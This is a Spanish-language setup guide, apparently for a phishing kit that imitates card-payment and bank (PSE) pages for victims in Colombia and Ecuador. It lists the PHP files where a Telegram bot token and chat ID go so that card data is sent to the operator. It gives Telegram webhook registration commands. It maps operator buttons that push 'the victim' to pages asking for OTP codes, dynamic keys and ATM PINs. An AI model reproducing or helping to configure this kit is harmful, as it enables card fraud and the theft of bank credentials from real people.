2. DÓNDE CAMBIAR LAS CREDENCIALES DE TELEGRAM
--------------------------------------------------------------------------------

A) PAGOS CON TARJETA DE CRÉDITO (MÓDULO PRINCIPAL)
   Para cambiar el Bot Token y el Chat ID donde llegan los datos de tarjeta y
   los botones interactivos (Token, Dinámica, Cajero, Error TC, Finalizar):

   🇨🇴 COLOMBIA:
   - Archivo: colombia/data-cc/1.php  (Líneas 19 y 20)
   - Archivo: colombia/1.php          (Líneas 19 y 20)

   🇪🇨 ECUADOR:
   - Archivo: ecuador/data-cc/1.php   (Líneas 19 y 20)
   - Archivo: ecuador/1.php           (Líneas 19 y 20)

   Código a modificar:
   ------------------------------------------------------------
   $botToken = "TU_BOT_TOKEN_AQUI";
   $chatId   = "TU_CHAT_ID_AQUI";
   ------------------------------------------------------------


B) ARCHIVO CENTRAL DE CONFIGURACIÓN
   🇨🇴 colombia/config.php
   🇪🇨 ecuador/config.php

   Código a modificar:
   ------------------------------------------------------------
   return [
       "bot_token"   => "TU_BOT_TOKEN_AQUI",
       "chat_id"     => "TU_CHAT_ID_AQUI",
       "webhook_url" => "https://TU_DOMINIO/webhook.php"
   ];
   ------------------------------------------------------------


C) FORMULARIO DE PASO Y RECARGAS (PSE / BANCOS)
   Si utilizas las pasarelas bancarias secundarias:
   - colombia/botmaster.php y ecuador/botmaster.php
   - colombia/botmaster2.php y ecuador/botmaster2.php
   - colombia/procesar_formulario.php y ecuador/procesar_formulario.php
   - colombia/data-ps/recargas/transaction/...

3. CÓMO CONFIGURAR O ACTIVAR EL WEBHOOK DE TELEGRAM
--------------------------------------------------------------------------------
Para que los botones de Telegram (🔑 TOKEN, 📱 DINÁMICA, 🏧 CAJERO, ❌ ERROR TC,
✅ FINALIZAR) respondan en tiempo real en la pantalla de la víctima, el webhook
debe estar registrado con tu dominio SSL (HTTPS):

1. Abre tu navegador o ejecuta en terminal:
   https://api.telegram.org/bot<TU_BOT_TOKEN>/setWebhook?url=https://<TU_DOMINIO>/webhook.php

2. Para verificar que el webhook esté activo y sin errores:
   https://api.telegram.org/bot<TU_BOT_TOKEN>/getWebhookInfo

* Cuando el operador presiona un botón en Telegram, el webhook guarda la acción
  en la carpeta `actions/{transactionId}.txt` y el frontend (`1.php` / `check_updates.php`)
  lo lee al instante y redirige al usuario a la pantalla correspondiente.

--------------------------------------------------------------------------------
5. ACCIONES DE LOS BOTONES DE TELEGRAM Y REDIRECCIONES
--------------------------------------------------------------------------------
Al presionar los botones en el chat de Telegram, el sistema realiza:

- 🔑 TOKEN / OTP     --> Redirige a: pedir_otp.html
- 📱 DINÁMICA        --> Redirige a: pedir_dinamica.php
- 🏧 CAJERO          --> Redirige a: pedir_cajero.html / clave_cajero.html
- ❌ ERROR TC        --> Redirige a: payment.html?error=card_declined
- ✅ FINALIZAR       --> Redirige a: finish.html
